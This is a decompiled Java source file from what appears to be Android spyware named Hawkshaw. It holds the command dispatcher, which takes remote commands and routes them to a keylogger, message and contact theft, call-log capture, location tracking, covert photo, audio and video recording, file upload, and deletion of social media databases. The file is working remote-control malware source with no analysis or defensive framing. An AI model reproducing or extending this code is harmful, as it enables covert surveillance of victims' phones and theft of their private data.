package com.hawkshaw.library.handler;

import E0.C0010a;
import F3.b;
import W2.y;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import androidx.core.app.NotificationCompat;
import b3.C0298a;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.socket.SocketService;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.fcm.Pushy;
import com.hawkshaw.library.features.AuthKt;
import com.hawkshaw.library.features.location.HandlerKt;
import com.hawkshaw.library.features.misc.DeviceAudioKt;
import com.hawkshaw.library.features.misc.InstalledAppListKt;
import com.hawkshaw.library.features.misc.MiscKt;
import com.hawkshaw.library.features.misc.VibratorKt;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.logger.PushLogsKt;
import me.pushy.sdk.lib.jackson.core.sym.CharsToNameCanonicalizer;
import me.pushy.sdk.lib.jackson.databind.deser.std.StdKeyDeserializer;
import me.pushy.sdk.lib.paho.MqttConnectOptions;
import t3.N;

public final class CommandResolverKt {
    private static final String TAG = "CommandResolver";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(102:0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|60|61|62|63|64|65|66|67|68|69|70|71|72|73|74|75|76|77|78|79|80|81|82|83|84|85|86|87|88|89|90|91|92|93|94|95|96|97|98|(2:99|100)|101|103) */
        /* JADX WARNING: Can't wrap try/catch for region: R(103:0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|60|61|62|63|64|65|66|67|68|69|70|71|72|73|74|75|76|77|78|79|80|81|82|83|84|85|86|87|88|89|90|91|92|93|94|95|96|97|98|99|100|101|103) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:11:0x0034 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:13:0x003d */
        /* JADX WARNING: Missing exception handler attribute for start block: B:15:0x0046 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x0050 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:19:0x005a */
        /* JADX WARNING: Missing exception handler attribute for start block: B:21:0x0064 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:23:0x006e */
        /* JADX WARNING: Missing exception handler attribute for start block: B:25:0x0078 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:27:0x0082 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:29:0x008c */
        /* JADX WARNING: Missing exception handler attribute for start block: B:31:0x0096 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:33:0x00a0 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:35:0x00aa */
        /* JADX WARNING: Missing exception handler attribute for start block: B:37:0x00b4 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:39:0x00be */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:41:0x00c8 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:43:0x00d2 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:45:0x00dc */
        /* JADX WARNING: Missing exception handler attribute for start block: B:47:0x00e6 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:49:0x00f0 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:51:0x00fa */
        /* JADX WARNING: Missing exception handler attribute for start block: B:53:0x0104 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:55:0x010e */
        /* JADX WARNING: Missing exception handler attribute for start block: B:57:0x0118 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:59:0x0122 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:61:0x012c */
        /* JADX WARNING: Missing exception handler attribute for start block: B:63:0x0136 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:65:0x0140 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:67:0x014a */
        /* JADX WARNING: Missing exception handler attribute for start block: B:69:0x0154 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:71:0x015e */
        /* JADX WARNING: Missing exception handler attribute for start block: B:73:0x0168 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:75:0x0172 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:77:0x017c */
        /* JADX WARNING: Missing exception handler attribute for start block: B:79:0x0186 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0022 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:81:0x0190 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:83:0x019a */
        /* JADX WARNING: Missing exception handler attribute for start block: B:85:0x01a4 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:87:0x01ae */
        /* JADX WARNING: Missing exception handler attribute for start block: B:89:0x01b8 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:91:0x01c2 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:93:0x01cc */
        /* JADX WARNING: Missing exception handler attribute for start block: B:95:0x01d6 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:97:0x01e0 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:99:0x01ea */
        /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x002b */
        static {
            
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.Unknown     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.Login     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushTokens     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushData     // Catch:{ NoSuchFieldError -> 0x002b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.StartRepeatPushData     // Catch:{ NoSuchFieldError -> 0x0034 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                r2 = 5
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
            L_0x0034:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.StopRepeatPushData     // Catch:{ NoSuchFieldError -> 0x003d }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                r2 = 6
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003d }
            L_0x003d:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushLocation     // Catch:{ NoSuchFieldError -> 0x0046 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                r2 = 7
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0046 }
            L_0x0046:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.Vibrate     // Catch:{ NoSuchFieldError -> 0x0050 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0050 }
                r2 = 8
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0050 }
            L_0x0050:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushInstalledAppList     // Catch:{ NoSuchFieldError -> 0x005a }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x005a }
                r2 = 9
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x005a }
            L_0x005a:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAppLogs     // Catch:{ NoSuchFieldError -> 0x0064 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0064 }
                r2 = 10
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0064 }
            L_0x0064:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.ConnectSocket     // Catch:{ NoSuchFieldError -> 0x006e }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x006e }
                r2 = 11
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x006e }
            L_0x006e:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.DisconnectSocket     // Catch:{ NoSuchFieldError -> 0x0078 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0078 }
                r2 = 12
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0078 }
            L_0x0078:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.MakeCall     // Catch:{ NoSuchFieldError -> 0x0082 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0082 }
                r2 = 13
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0082 }
            L_0x0082:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushDeviceAudio     // Catch:{ NoSuchFieldError -> 0x008c }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x008c }
                r2 = 14
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x008c }
            L_0x008c:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.SetDeviceAudio     // Catch:{ NoSuchFieldError -> 0x0096 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0096 }
                r2 = 15
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0096 }
            L_0x0096:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.OpenApp     // Catch:{ NoSuchFieldError -> 0x00a0 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00a0 }
                r2 = 16
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00a0 }
            L_0x00a0:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushDeviceInfo     // Catch:{ NoSuchFieldError -> 0x00aa }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00aa }
                r2 = 17
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00aa }
            L_0x00aa:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.OpenDeeplink     // Catch:{ NoSuchFieldError -> 0x00b4 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00b4 }
                r2 = 18
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00b4 }
            L_0x00b4:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.GetDiagnosis     // Catch:{ NoSuchFieldError -> 0x00be }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00be }
                r2 = 19
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00be }
            L_0x00be:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.ScheduleCommand     // Catch:{ NoSuchFieldError -> 0x00c8 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00c8 }
                r2 = 20
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00c8 }
            L_0x00c8:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.CancelScheduledCommand     // Catch:{ NoSuchFieldError -> 0x00d2 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00d2 }
                r2 = 21
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00d2 }
            L_0x00d2:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.SetDynamicConfig     // Catch:{ NoSuchFieldError -> 0x00dc }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00dc }
                r2 = 22
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00dc }
            L_0x00dc:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushDynamicConfig     // Catch:{ NoSuchFieldError -> 0x00e6 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00e6 }
                r2 = 23
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00e6 }
            L_0x00e6:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.StartInitializer     // Catch:{ NoSuchFieldError -> 0x00f0 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00f0 }
                r2 = 24
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00f0 }
            L_0x00f0:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.RunAccessibilityCommand     // Catch:{ NoSuchFieldError -> 0x00fa }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x00fa }
                r2 = 25
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x00fa }
            L_0x00fa:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAccessibilityKeylogger     // Catch:{ NoSuchFieldError -> 0x0104 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0104 }
                r2 = 26
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0104 }
            L_0x0104:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAccessibilityNotifications     // Catch:{ NoSuchFieldError -> 0x010e }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x010e }
                r2 = 27
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x010e }
            L_0x010e:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAccessibilitySocialMedia     // Catch:{ NoSuchFieldError -> 0x0118 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0118 }
                r2 = 28
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0118 }
            L_0x0118:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.AccessibilityNukeSocialMediaDatabase     // Catch:{ NoSuchFieldError -> 0x0122 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0122 }
                r2 = 29
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0122 }
            L_0x0122:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushMessages     // Catch:{ NoSuchFieldError -> 0x012c }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x012c }
                r2 = 30
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x012c }
            L_0x012c:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.SendMessage     // Catch:{ NoSuchFieldError -> 0x0136 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0136 }
                r2 = 31
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0136 }
            L_0x0136:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushContacts     // Catch:{ NoSuchFieldError -> 0x0140 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0140 }
                r2 = 32
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0140 }
            L_0x0140:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.AddContact     // Catch:{ NoSuchFieldError -> 0x014a }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x014a }
                r2 = 33
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x014a }
            L_0x014a:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.DeleteContact     // Catch:{ NoSuchFieldError -> 0x0154 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0154 }
                r2 = 34
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0154 }
            L_0x0154:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushCallLogs     // Catch:{ NoSuchFieldError -> 0x015e }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x015e }
                r2 = 35
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x015e }
            L_0x015e:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.AddCallLog     // Catch:{ NoSuchFieldError -> 0x0168 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0168 }
                r2 = 36
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0168 }
            L_0x0168:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.DeleteCallLog     // Catch:{ NoSuchFieldError -> 0x0172 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0172 }
                r2 = 37
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0172 }
            L_0x0172:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.Flash     // Catch:{ NoSuchFieldError -> 0x017c }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x017c }
                r2 = 38
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x017c }
            L_0x017c:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.TakePicture     // Catch:{ NoSuchFieldError -> 0x0186 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0186 }
                r2 = 39
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0186 }
            L_0x0186:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.RecordVideo     // Catch:{ NoSuchFieldError -> 0x0190 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0190 }
                r2 = 40
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0190 }
            L_0x0190:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.RecordAudio     // Catch:{ NoSuchFieldError -> 0x019a }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x019a }
                r2 = 41
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x019a }
            L_0x019a:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushFileExplorerWalk     // Catch:{ NoSuchFieldError -> 0x01a4 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01a4 }
                r2 = 42
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01a4 }
            L_0x01a4:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushThumbnails     // Catch:{ NoSuchFieldError -> 0x01ae }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01ae }
                r2 = 43
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01ae }
            L_0x01ae:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushFile     // Catch:{ NoSuchFieldError -> 0x01b8 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01b8 }
                r2 = 44
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01b8 }
            L_0x01b8:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushFiles     // Catch:{ NoSuchFieldError -> 0x01c2 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01c2 }
                r2 = 45
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01c2 }
            L_0x01c2:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.GetPendingPushFiles     // Catch:{ NoSuchFieldError -> 0x01cc }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01cc }
                r2 = 46
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01cc }
            L_0x01cc:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.DeletePendingPushFiles     // Catch:{ NoSuchFieldError -> 0x01d6 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01d6 }
                r2 = 47
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01d6 }
            L_0x01d6:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.DeleteFile     // Catch:{ NoSuchFieldError -> 0x01e0 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01e0 }
                r2 = 48
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01e0 }
            L_0x01e0:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.SyncPushFiles     // Catch:{ NoSuchFieldError -> 0x01ea }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01ea }
                r2 = 49
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01ea }
            L_0x01ea:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.SyncAppConfig     // Catch:{ NoSuchFieldError -> 0x01f4 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x01f4 }
                r2 = 50
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x01f4 }
            L_0x01f4:
                $EnumSwitchMapping$0 = r0
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.handler.CommandResolverKt.WhenMappings.<clinit>():void");
        }
    }

    public static final Object handleCommand(Command command, CommandSource commandSource, e eVar) {
        if (commandSource != CommandSource.Pushy) {
            Logger logger = Logger.INSTANCE;
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            String b5 = json.b(Command.Companion.serializer(), command);
            Logger.d$default(logger, TAG, "Command Received: " + b5 + ", " + commandSource, false, 4, (Object) null);
        }
        int i5 = WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()];
        y yVar = y.f2418a;
        switch (i5) {
            case 1:
                Logger.e$default(Logger.INSTANCE, TAG, C0010a.n("Unknown command, ", command.getSentTime()), (Exception) null, false, 12, (Object) null);
                break;
            case 2:
                AuthKt.login(command.getLoginRequest());
                break;
            case 3:
                Object pushTokensToServer = Pushy.INSTANCE.pushTokensToServer(eVar);
                return pushTokensToServer == C0298a.f4140D ? pushTokensToServer : yVar;
            case 4:
                Object pushData = PushDataKt.pushData(eVar);
                return pushData == C0298a.f4140D ? pushData : yVar;
            case 5:
                JobScheduler.INSTANCE.startScheduler(command.getStartRepeatPushDataRequest());
                break;
            case 6:
                JobScheduler.INSTANCE.stopScheduler();
                break;
            case 7:
                HandlerKt.pushLocation(command.getGetLocationRequest());
                break;
            case 8:
                Object vibrate = VibratorKt.vibrate(command.getVibrateRequest(), eVar);
                return vibrate == C0298a.f4140D ? vibrate : yVar;
            case 9:
                Object pushInstalledAppList = InstalledAppListKt.pushInstalledAppList(App.Companion.getContext(), eVar);
                return pushInstalledAppList == C0298a.f4140D ? pushInstalledAppList : yVar;
            case 10:
                Object pushAppLogs = PushLogsKt.pushAppLogs(eVar);
                return pushAppLogs == C0298a.f4140D ? pushAppLogs : yVar;
            case 11:
                Object connectSocket = SocketService.Companion.connectSocket(eVar);
                return connectSocket == C0298a.f4140D ? connectSocket : yVar;
            case 12:
                SocketService.Companion.disconnectSocket();
                break;
            case 13:
                com.hawkshaw.library.features.telephony.HandlerKt.handleTelephonyCommand(command);
                break;
            case StdKeyDeserializer.TYPE_URL /*14*/:
            case StdKeyDeserializer.TYPE_CLASS /*15*/:
                DeviceAudioKt.handleDeviceAudioCommand(command);
                break;
            case 16:
            case StdKeyDeserializer.TYPE_BYTE_ARRAY /*17*/:
            case 18:
            case 19:
            case 20:
            case 21:
            case 22:
            case 23:
            case 24:
                Object handleMiscCommand = MiscKt.handleMiscCommand(command, eVar);
                return handleMiscCommand == C0298a.f4140D ? handleMiscCommand : yVar;
            case NotificationCompat.MessagingStyle.MAXIMUM_RETAINED_MESSAGES:
            case 26:
            case 27:
            case 28:
            case 29:
                Object handleAccessibilityCommand = com.hawkshaw.library.features.accessibility.HandlerKt.handleAccessibilityCommand(command, eVar);
                return handleAccessibilityCommand == C0298a.f4140D ? handleAccessibilityCommand : yVar;
            case MqttConnectOptions.CONNECTION_TIMEOUT_DEFAULT /*30*/:
            case 31:
                Object handleMessagesCommand = com.hawkshaw.library.features.telephony.messages.HandlerKt.handleMessagesCommand(command, eVar);
                return handleMessagesCommand == C0298a.f4140D ? handleMessagesCommand : yVar;
            case 32:
            case CharsToNameCanonicalizer.HASH_MULT /*33*/:
            case 34:
                Object handleContactsCommand = com.hawkshaw.library.features.telephony.contacts.HandlerKt.handleContactsCommand(command, eVar);
                return handleContactsCommand == C0298a.f4140D ? handleContactsCommand : yVar;
            case 35:
            case 36:
            case 37:
                Object handleCallLogsCommand = com.hawkshaw.library.features.telephony.calllogs.HandlerKt.handleCallLogsCommand(command, eVar);
                return handleCallLogsCommand == C0298a.f4140D ? handleCallLogsCommand : yVar;
            case 38:
            case 39:
            case 40:
            case 41:
                Object handleMediaCommand = com.hawkshaw.library.features.media.HandlerKt.handleMediaCommand(command, eVar);
                return handleMediaCommand == C0298a.f4140D ? handleMediaCommand : yVar;
            case 42:
            case 43:
            case 44:
            case 45:
            case 46:
            case 47:
            case 48:
            case 49:
                Object handleFileCommand = com.hawkshaw.library.features.media.HandlerKt.handleFileCommand(command, eVar);
                return handleFileCommand == C0298a.f4140D ? handleFileCommand : yVar;
            case 50:
                Object handleSyncAppConfig = SyncAppConfigKt.handleSyncAppConfig(command, eVar);
                return handleSyncAppConfig == C0298a.f4140D ? handleSyncAppConfig : yVar;
        }
        return yVar;
    }

    public static /* synthetic */ Object handleCommand$default(Command command, CommandSource commandSource, e eVar, int i5, Object obj) {
        if ((i5 & 2) != 0) {
            commandSource = CommandSource.Unknown;
        }
        return handleCommand(command, commandSource, eVar);
    }

    public static final void handleCommandString(String str, CommandSource commandSource) {
        K.n(str, "commandStr");
        K.n(commandSource, "source");
        CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new T1.b(str, commandSource, (e) null), 1, (Object) null);
    }
}
